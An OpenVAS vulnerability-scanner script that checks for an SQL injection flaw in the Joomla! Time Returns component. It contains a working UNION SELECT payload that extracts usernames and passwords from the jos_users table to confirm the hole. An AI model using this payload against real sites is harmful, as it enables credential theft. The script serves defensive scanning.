##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_time_returns_id_param_sql_inj_vuln.nasl 7015 2017-08-28 11:51:24Z teissa $
#
# Joomla! Time Returns Component 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will let attackers to cause SQL Injection
attack and gain sensitive information.

Impact Level: Application";

tag_affected = "Joomla! Time Returns Component Version 2.0";

tag_insight = "The flaw is caused by improper validation of user-supplied input
via the 'id' parameter to index.php (when 'option' is set to 'com_timereturns'
and 'view' is set to 'timereturns'), which allows attacker to manipulate SQL
queries by injecting arbitrary SQL code.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla! Time Returns component and is prone to
SQL injection vulnerability.";

if(description)
{
  script_id(902584);
  script_version("$Revision: 7015 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-28 13:51:24 +0200 (Mon, 28 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-10-28 16:17:13 +0200 (Fri, 28 Oct 2011)");
  script_bugtraq_id(50026);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Joomla! Time Returns Component 'id' Parameter SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46267");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50026");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17944");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/105619/joomlatimereturns-sql.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Joomla Directory
if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
  exit(0);
}

## Construct the Attack Request
url = string(dir, "/index.php?option=com_timereturns&view=timereturns&id=7+",
             "union+all+select+concat_ws(0x6f7674657374,0x3a,username,0x3a,",
             "password,0x3a,0x6f7674657374),2,3,4,5,6+from+jos_users--");

## Try attack and check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, pattern:'ovtest:.*:.*:ovtest',
                   check_header: TRUE)){
  security_message(port);
}
